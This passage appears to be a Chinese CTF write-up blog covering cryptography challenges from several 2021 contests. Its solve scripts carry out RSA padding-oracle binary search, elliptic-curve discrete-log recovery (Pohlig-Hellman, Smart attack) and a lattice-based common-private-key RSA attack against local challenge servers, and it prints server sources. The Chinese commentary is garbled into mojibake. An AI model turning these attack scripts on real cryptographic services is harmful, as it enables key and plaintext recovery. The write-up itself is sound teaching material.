¹\næœ‰äº›æ˜¯ç¥ä»™ç‚«æŠ€ç›´æ¥ éŸ¦è¾¾å®šç† æˆ–è€… è´¹ç›å¤§å®šç†\næ‹¿åˆ°å•ç‹¬çš„skåå°±å¯ä»¥æäº‹æƒ…äº†\nEVéƒ½æ˜¯å·²çŸ¥ï¼Œcä¹Ÿå·²çŸ¥ ç›´æ¥ç®—å°±ğŸ†—äº†\nsolve-step1\nfrom Crypto.Util.number import * from icecream import * from hashlib import sha256 from gmpy2 import * import libnum from pwn import * from libnum import * def h2(m): return int(sha256(m).hexdigest(), 16) io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) #1 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;1\u0026#39;) io.recvuntil(\u0026#39;Please take good care of it!\\n\u0026#39;) pk_sk=io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode()[2:-1].split(\u0026#39;L,0x\u0026#39;) pk,sk=int(pk_sk[0],16),int(pk_sk[1],16) #2 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;2\u0026#39;) pp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 group_list = [32, 64, 128, 256] DD=1 for group in group_list: io.recvuntil(\u0026#39;The cipher shared to you\\n\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) new_cipher=[cc] new_cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) c,E_,V_,s_=new_cipher io.recvuntil(\u0026#39;prefix, encoder = \u0026#39;) Enc2,prefix=pre_enc=eval(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) prefix=int(prefix,16) encoder=[1,(-pow(prefix,sk,pp)) %pp] prefix = long_to_bytes(prefix).rjust(64, b\u0026#39;\\x00\u0026#39;) ml=[1] for i in range(len(Enc2)): ml.append((ml[-1]*encoder[-1]+Enc2[i]*(-1)**(i+1))%pp) r=-ml[-1]%pp dd = h2(prefix + long_to_bytes(r).rjust(64, b\u0026#39;\\x00\u0026#39;)) | 1 DD*=dd d=libnum.invmod(dd,pp-1) tmp=E_*V_%pp xx=pow(tmp,d,pp) m=c*libnum.invmod(xx,pp)%pp io.send(hex(m)[2:]) io.recvuntil(\u0026#39;You are a clever boy! Now I can share you some other information!\\n0x\u0026#39;) mul=int(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-2],16) ic(DD) ic(mul) #3 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;3\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) cipher=[cc] cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) ic(cipher) solve-step2\nfrom gmpy2 import * io=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 D=15987058835088036058838351739905403758810826722245822649290306549906899936826738229650730140126509371862930340608846190807298868677166971678478129606238898364288362139315516922003581996769819030117310508402522153899137933429897987557331966070437119010259514160059698255241259153692392463260794449949596746727 mul=7194716155235037744823597029059822446255314248196377746260315999958188811928743123657567494196521690514320209430663462342437059567384744437239548754416135 c=mul*libnum.invmod(D,io)%io e=4 R.\u0026lt;x\u0026gt; = Zmod(io)[] f = x ^ e- c f = f.monic() res1 = f.roots() print(res1) solve-step3\nfrom Crypto.Util.number import * from gmpy2 import * pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771 cipher=[1452085683981538837849557434841689674477096081702343000869186835544808468459192026693029532721465657214194362000756249662047209552808256166535501585736401, 9299317806552199012103361766715291248186887467752322286719294121971787657296205598139365760833959784768412272593061318430853065277862724140493914797711689, 9287316455075844376168558534606543590293095721271733423230961724912040658757071778242087450272981713664977773510705690081763692753388091475741636185572383, 229110517869350912236518454062717456777603700368163296438479618211042488031942897036793380693680124455343059560507824269299022538059530971380675264277197] c,E,V,s=cipher xx=E*V%pp m=c*libnum.invmod(pow(xx,sk,pp),pp)%pp print(long_to_bytes(m)) #flag{504d0411-6707-469b-be31-9868200aca95} å­¦åˆ°å¾ˆå¤š\nè“å¸½ber final # https://github.com/ljahum/crypto-challenges/tree/main/%E8%93%9D%E7%8C%AB2021/final/twoBytes\ntwobyte # äºŒåˆ†æ³•\nä¼ å…¥$C\\times padding^e$\nåˆ©ç”¨é«˜ä½çš„two bytesåˆ¤æ–­$M\\times paddingå’Œ2^{496}$çš„å¤§å°å…³ç³»(512-16=496)\nåˆ©ç”¨äºŒåˆ†æ³•æŸ¥æ‰¾paddingçš„å€¼\næŸ¥æ‰¾çº¦1000+æ¬¡å¯ä»¥æ¢å¤secret\nsolve # from subprocess import run from Crypto.Util.number import long_to_bytes from icecream import * from pwn import * import re from pwnlib.util.iters import pad def b2s(s): if(type(s)==str): return s else: return s.decode() def CatNum(txt): txt = b2s(txt) matchObj = re.findall(r\u0026#39;[0-9]+\u0026#39;, txt) return matchObj def dec(n): print(io.recvuntil(\u0026#39;Your choice: \u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;Your cipher: \u0026#39;)) io.sendline(str(n)) return io.recvline()[:-1] def bigger(mid,c): # tmp1 = pow(mid,e,n) # ic(tmp1) tmp = (c*pow(mid,e,n))%n print(tmp) # ic(padding) m = dec(tmp) ic(m) if(m!=b\u0026#39;0000\u0026#39;): return True else: return False io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) # print(io.recv(1024)) io.recvuntil(\u0026#39;PKCS1_v1_6?(y/n)\u0026#39;) io.sendline(\u0026#39;n\u0026#39;) e = int(CatNum(io.recvline())[0]) n = int(CatNum(io.recvline())[0]) c = int(CatNum(io.recvline())[0]) ic(e,c,n) \u0026#39;\u0026#39;\u0026#39;ä¼°ç®—paddingèŒƒå›´ padding = 1 h = 0 for i in range(512): tmp1 = pow(padding,e,n) ic(tmp1) tmp = (c*tmp1)%n print(tmp) ic(padding) m = dec(tmp) ic(m,i) if(m!=b\u0026#39;0000\u0026#39;): h=i input() break padding *= 2 \u0026#39;\u0026#39;\u0026#39; # pad=240~260 pl = 2**200 ph = 2**496 mid= (pl+ph)//2 input() for i in range(512): # tmp = m*mid # ic(tmp-n) if(bigger(mid,c)==True): ph=mid-1 mid = (mid+pl)//2 else: pl=mid+1 mid =(mid+ph)//2 # print(mid) # input() ic(mid) n=2**496 s =n//mid secret = long_to_bytes(s) ic(secret) ic(secret.hex()) print(io.recvuntil(\u0026#39;Your choice: \u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) io.sendline(secret.hex()) sleep(0.5) print(io.recv(1024)) b\u0026#39;Your choice: \u0026#39; b\u0026#34;You know my secret? (in hex): b\u0026#39;flag{ba1f2511fc30423bdbb183fe33f3dd0f}\u0026#39;\\n\u0026#34; [*] Closed connection to 0.0.0.0 port 10001 ïŒ› ï„• /mnt/c/U/16953/Desktop/twoBytes took ï‰’ 11s at ï€— 11:38:42 AM â¯ document for 5th space2021 # å”¯ä¸€ä»¥æœ‰ç‚¹æ„æ€çš„æ‰¾æœ€çŸ­å‘é‡é—®é¢˜ï¼ˆSVPï¼‰å¬è¯´ä¸€å †éé¢„æœŸæ‰“çƒ‚äº†ï¼Œèƒ½æ‰¾åˆ°çš„wpå…¨æ˜¯éé¢„æœŸï¼ˆç¬‘ğŸ¤£ æ„Ÿè§‰ä¸å¦‚ã€‚ã€‚ã€‚ã€‚ç”»è´¨\nECC # ä¸‰æ®µECCçš„å¥—å¨ƒï¼Œä¸€çœ‹å°±æ˜¯æ‰¾è€å¹´èµ›æ£å‡ºçš„ç¼åˆé¢˜ï¼Œè®°äº†æ²¡ç”¨ ä¸è®°åˆä¸è¡Œ\nTask\nprint \u0026#39;Try to solve the 3 ECC\u0026#39; from secret import flag from Crypto.Util.number import * assert(flag[:5]==\u0026#39;flag{\u0026#39;) flag = flag[5:-1] num1 = bytes_to_long(flag[:7]) num2 = bytes_to_long(flag[7:14]) num3 = bytes_to_long(flag[14:]) def ECC1(num): p = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q def ECC2(num): p = 1256438680873352167711863680253958927079458741172412327087203 #import random #A = random.randrange(389718923781273978681723687163812) #B = random.randrange(816378675675716537126387613131232121431231) A = 377999945830334462584412960368612 B = 604811648267717218711247799143415167229480 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q factors, exponents = zip(*factor(E.order())) primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-1] print primes dlogs = [] for fac in primes: t = int(int(P.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=\u0026#34;+\u0026#34;) dlogs += [dlog] print(\u0026#34;factor: \u0026#34;+str(fac)+\u0026#34;, Discrete Log: \u0026#34;+str(dlog)) #calculates discrete logarithm for each prime order print num print crt(dlogs,primes) def ECC3(num): p = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q ECC1(num1) print \u0026#39;==============\u0026#39; ECC2(num2) print \u0026#39;==============\u0026#39; ECC3(num3) stage1 # å¾ˆæ˜æ˜¾ç»™çš„è¿™å‡ ä¸ªæ•°å¾ˆå°ï¼Œç”¨sageè‡ªå¸¦çš„ç¦»æ•£å¯¹æ•°æ±‚è§£ä¸‰ä»¶å¥—æ¢­ä¸€éå¾—åˆ°ç­”æ¡ˆ\np = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E(119851377153561800,50725039619018388) Q = E(22306318711744209, 111808951703508717) n = discrete_log(Q, P, operation=\u0026#39;+\u0026#39;) print(n) # 13566003730592612 stage2 # è€ƒçƒ‚çš„CRT in ECCçŸ¥è¯†ç‚¹\nä¸€åŠç‰¹å¾æ˜¯E.order()åˆ†è§£å‡ºæ¥çš„ç´ å› å­æœ‰é—®é¢˜ï¼Œä¸€èˆ¬ç‰¹å¾å°±æ˜¯å‰é¢çš„å› å­éƒ½ä¸å¤§ï¼Œåé¢æœ‰ä¸€ä¸ªå¾ˆå¤§çš„å› å­\nåŒæ—¶ä½ è¿˜å¯ä»¥çŸ¥é“nå…¶å®ä¹Ÿä¸æ˜¯å¤ªå¤§ï¼ŒE.order()å°±æ˜¯ECCçš„é˜¶ï¼Œæ„æ€å°±æ˜¯è¿™æ•´ä¸ªECCçš„æ›²çº¿ä¸Šä¸€å…±æœ‰å¤šå°‘ä¸ªä¸åŒçš„ç¦»æ•£çš„ç‚¹\nreferï¼š\nblueHat final PicoCTF 2017: ECC2 æŸé¢†èˆªæ¯è¢«pyçƒ‚çš„é¢˜ p = 1256438680873352167711863680253958927079458741172412327087203 a = 377999945830334462584412960368612 b = 604811648267717218711247799143415167229480 gx = 550637390822762334900354060650869238926454800955557622817950 gy = 700751312208881169841494663466728684704743091638451132521079 px = 1152079922659509908913443110457333432642379532625238229329830 py = 819973744403969324837069647827669815566569448190043645544592 E = EllipticCurve(GF(p), [a, b]) G = E(gx, gy) n = E.order() QA = E(px, py) factors = list(factor(n)) m = 1 moduli = [] remainders = [] print(f\u0026#34;[+] Running Pohlig Hellman\u0026#34;) print(factors) for i, j in factors: if i \u0026gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=\u0026#39;+\u0026#39;) remainders.append(r) moduli.append(mod) m *= mod r = crt(remainders, moduli) print(r) # 16093767336603949 # 9-2521- stage3 # E.order() = pçš„æ—¶å€™ å¯ä»¥ç”¨ä¸€ä¸ªå«åšSMARTæ”»å‡»çš„æ“ä½œ\nå»å¹´å­¦çš„æ—¶å€™è§åˆ°è¿‡ï¼Œä½†æ¢ç”µè„‘ææ²¡äº†ï¼Œç´¢æ€§åœ¨è®°å½•ä¸€é\np = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E(10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861,8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610) Q = E(964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927,5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) r = SmartAttack(P, Q, p) print(r) # 19597596255129283097357413993866074145935170485891892 # 4a81-9957-8c3381622434 Document for ä¸œåber2021 # pyå¤§èµ› è¯¸ç¥é»„æ˜ï¼Œä¾æ—§æ˜¯æŠ½ä¸€ä¸­åˆåˆä¼‘è®°ä¸€ä¸‹é¢˜\nThersa # åˆæ˜¯ä¸€ä¸ªè€ƒçƒ‚çš„æ°´é¢˜\nsrc\nfrom Crypto.Util.number import* from hashlib import sha256 import socketserver import signal import string import random from secret import flag table = string.ascii_letters+string.digits flag = bytes_to_long(flag) MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Get Encrypt: [+] 2.Exit: \u0026#39;\u0026#39;\u0026#39; class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def EncRy(self): p,q = getPrime(512),getPrime(512) n = p * q phi = (p - 1) * (q - 1) e = inverse(self.d, phi) c = pow(flag, e, n) return(e,n,c) def handle(self): signal.alarm(60) if not self.proof_of_work(): return self.send(b\u0026#34;Welcome to my RSA!\u0026#34;) self.d = getPrime(random.randint(435, 436)) while 1: self.send(MENU) self.send(b\u0026#34;Now!What do you want to do?\u0026#34;) option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(str(self.EncRy()).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ‰€æœ‰çš„å¯†æ–‡éƒ½æ˜¯é€šè¿‡ $d$ å»äº§ç”Ÿå®ç°çš„,common private key æ”»å‡»\nreferï¼š\nSctf2020 rsa vnå…¬å¼€èµ›factor(å°è±¡ä¸­æ˜¯å«è¿™ä¸ª) æ ¹æ®å®é™…æƒ…å†µåº”è¯¥æ˜¯å¯ä»¥è·å–$N$ç»„ å†ç…§ç€æ ·ä¾‹\næ”¹æ”¹å‚æ•°å¤§å°ä½¿å…¶æ»¡è¶³é¢˜ç›®è¦æ±‚å’Œè®ºæ–‡ç»™çš„èŒƒå›´å³å¯\nsolve # #sagemath from Crypto.Util.number import * from gmpy2 import iroot e1,n1,c1=(42930516866813661342965746223080520747639541783178165319930798466029922118238472375394025163017796792784301240279788973937514266651107411418409008126879890591634663600650622272276047586523991529128830751549916767006347857754606279093837920255744001556692088644997689518547315534397835105708024032114104233381, 77791057667316752688491344909349631143733665781985333450578141862483326292146944912417154290062439390262044781769179125790833684914883275144238169619259170245799297149721759503884049470266984858779855785527134093827380541390671671421065142834758715718012985245418556303458870683285396736465075774918756943849, 27391282824232696321494182390733866553767929957526280387298565758936575846502788790274502139115326807546265156509536800727262991966913839267428385697513824611497066201158201419561518562486879276509945503450941372856450148181065616319630297566761526958666976256485612007573889257294374864202830099675167224618) e2,n2,c2=(19018427406275508266725318182604693048036959850117857989040747866263767206396699322550948080332092809132375761217132996919018670944100226583113345224541762253472497934634295339952030040768111601599444464038423922436192382234875739639531699502158126381323466372283051777517214602215819494796932567681821951661, 79650072081042322662491093415989067423342888043380140123956989961183485888095357404757819859263343837741065918473041502132392064045360290315160760995892876549211580451883428599900857896989098491504167023490425266678783550124590746460833416198860457961338080633882718390420924183342764921882749848062331837157, 47371054845953307458071281584547821822800567401012561479295024891414125620585367467768382853051493673297474227621983913977611690329004811247719468085248653560735761224575841708898687339051979667968682445741679494814049520035089826802489552786717808162007554429409373562206869161512981004103668781786261071642) e3,n3,c3=(56543738058355787650458463296434379628548490866377456720748305513368031407432713681493384526759984858874833739323541806113831186630548095096957902346105190080635673052132358289744367039154224900185478860894300958278206372821874050674031918453348499825234769506256225325221089605204424199863739802675837768205, 79745878045239534073349506401894614077391259818245570439963094062152853043757431813193065050329923218395626939202508409314449221246402655169069682907439636880572885333431797158404833511447487493689075229003167933950464179409482597295179818105362744282535280033320439360295379327350145598779754591726149053127, 8406272869509814810291187732784177513812310985481896410437026715571367365909106171597609902128681517191154832846694541582315046341089395251486352127008536629880180333790535980063006233315170237788757595367545197059456798192233574190206607791108247915315239293315856045620536743732064060419019383653017754432) e4,n4,c4=(7084543689346197121827870073257673792657047196994323608218552636377497641605010832530473677981880825830062575269956770329035892637961925305684535520357897676757195804280616332451896105146968442795337854851958165225390355543144975973394614878012047483478453541789213191489356453542050105788672267671186622349, 84193779290507365404703859402732143439109001210124769414375603074891153195964512465635919253078833439745459555371587096356222637979782540883867956964113419688015746698472168356238337484900265019835855499846392509934587316309130977694018626484013012355408173625138875013785514921191427955103949196185104270953, 57188209081624431651145335231083235968076151504975133709205719008833316979899965113559550632823577949531094733328627686996343950189156687337540064474041791342122016380351392782138752676861412964076387375179224936788921872659232295048921383561342206164767267043862968315447568792822076799329961025512641107246) e5,n5,c5=(42832642928335275352734567465034497040617823999922718556444541540637575945318881858516365030723712293566938969239323128990546490351954020139702168583195387467822779475617077682710213996418869245088581793014583647801408719774140042233362914483058594181044708264940880873371340427513033621237883600041744259821, 100914764703986796503524746926824107407478498950896766954709765945739896574588237451261683044947676026816706250675210414995572771552251740398776761522312876711308663303631592599847201703544166011694904414367791567937596616962437750298179607007543994344224571625128530174980427056520743554240699599606017732453, 21119798060505043638458066841637396779462197838711219768901795233508035124251444985142140372296435557972489164083922904128749582124708137219016012302886951596946166275929450048887248788479585841059063956921630092232393741155010454512377332292347344811575552765907485744387780176768333870372377008256136186807) e6,n6,c6=(92302858091592048530164341892874939881833483518095068563859833484262743798872223903571012516471302801063982503961657026303472815350321491051234131656128422061238653211376015684800612577226731646341043305151595034538237258802687294046312571159904343739248977644957644677771388548256577367489970379574172464797, 117679207537303828303181692131284163456980142622326819854887578740836701695007074712199364783113450072522001526705110176578644797269399966145551464701075583136732122232247312391436901027876012971338176518412247421456590394727819899354372288058334724615114926953982773216858342784870874502568283116049857599697, 694728970163274338952272545132120395722399912878027385515433411574332882874655233664187165540396449753083157039600465154030742189987900065124001404191085619372639241055402339355981737758090185934672051842827196968679043511560501886410676350912217561099905662581686696249610217183042166978654689061472935255) e7,n7,c7=(107958832210740007280315466139290077026935359625782760172740000594364460869128124940009236566874443252250812468875065019322671201219651761405497245501179554045401769228061173131905805679002507830926816675819378142336365243119257538909791638758850962854709130774816448647965771903108760260693930942445832581613, 124514631670412396955583333186310036282392256402221528788219590875160132086163249366732298557562280446982290995056571347900001555142302304165284003543211879382117786568833925378625035366897845326134848510307881296792070242801270087606140027163068970890264029919788362871312210162525628755395528824620664275981, 122802204066940916090785459557228909264312462241661083272739613123469038467287559936112649653314041478655145859464338716094314561339632033669065696677349425900229495594900454878607113262204411164149182327233978867883052370242620750529133958835635598563284037235210030872798337887481034016325891031269539006959) e8,n8,c8=(93032879096884833976354856506992993862316449685244948137669996162571278621479404733170084750947866321488473290655001676203288675188640293830346141700535957251408373865922564197265494466697836691672035371673758770683433485891640334014710181418750508413205768593981082149070901287189919968858883490943111987181, 126814261604881133528727989048158217150888497288150533655112145843950045425282139821602599229665745129453799945609742281626549287640177663087578340721569938344685390347348772958990014616194819409373556039354672378457009008450988307789399181204535224407248419395946571885338535639198634359608298711433536942733, 95330490027741440826424434337219961367405797139516869535055648011514837588374299753114991801669135223731470401046346436845011624597842223950760050976711965720535288001750040424144530196787933771814541562581236974965361143703635725068380670591839954283253531181890717506164459934317393787888216914582168459996) sqrn8=iroot(n8,2)[0] M=[ [sqrn8,e1,e2,e3,e4,e5,e6,e7,e8], [0,-n1,0,0,0,0,0,0,0], [0,0,-n2,0,0,0,0,0,0], [0,0,0,-n3,0,0,0,0,0], [0,0,0,0,-n4,0,0,0,0], [0,0,0,0,0,-n5,0,0,0], [0,0,0,0,0,0,-n6,0,0], [0,0,0,0,0,0,0,-n7,0], [0,0,0,0,0,0,0,0,-n8] ] M=matrix(ZZ,M) M=M.LLL() if M[0][0]\u0026lt;0: M=-M d,t1=M[0][0]//sqrn8,M[0][1] k1=(d*e1-t1)//n1 s1=(t1-1)//k1-1 var(\u0026#39;x\u0026#39;) F=x^2-s1*x+n1 p,q=F.roots()[0][0],F.roots()[1][0] p,q=abs(p),abs(q) d=inverse_mod(Integer(e1),(Integer(p)-1)*(Integer(q)-1)) print(long_to_bytes(pow(c1,d,n1))) #b\u0026#39;flag{338f4482-4f11-496c-a0d7-b06df53f79c5}\u0026#39; BlockEncrypt # åŸæ–‡ç»™äº†ä¸ªpycï¼Œä½†æ˜¯å¤ç›˜å°±æ‡’å¾—è§£åŒ…äº†æ\nsrc\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import flag from my_encrypt import block_encrypt from hashlib import sha256 import socketserver import signal import string import random import os table = string.ascii_letters+string.digits MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Encrypt the Flag: [+] 2.Encrypt your Plaintext: [+] 3.Exit: \u0026#39;\u0026#39;\u0026#39; def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def xor(msg1,msg2): assert len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def enc_msg(self,msg): return block_encrypt(pad(msg),self.key,self.ivv) def handle(self): signal.alarm(50) if not self.proof_of_work(): return self.ivv = os.urandom(16) self.key = os.urandom(16) while 1: self.send(MENU,newline = False) option = self.recv() if (option == b\u0026#39;1\u0026#39;): self.send(b\u0026#34;My Encrypted flag is:\u0026#34;) self.send(self.enc_msg(flag)) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;Give me Your Plain \u0026amp; I\u0026#39;ll give you the Cipher.\u0026#34;) plaintext = self.recv() self.send(b\u0026#39;PlainText:\u0026#39; + plaintext + b\u0026#39;\\nCipherText:\u0026#39; + self.enc_msg(plaintext)) else: break self.send(b\u0026#34;\\n[.]Down the Connection.\u0026#34;) self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() api my_encrypt.py\nfrom Crypto.Util.number import * Sbox = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 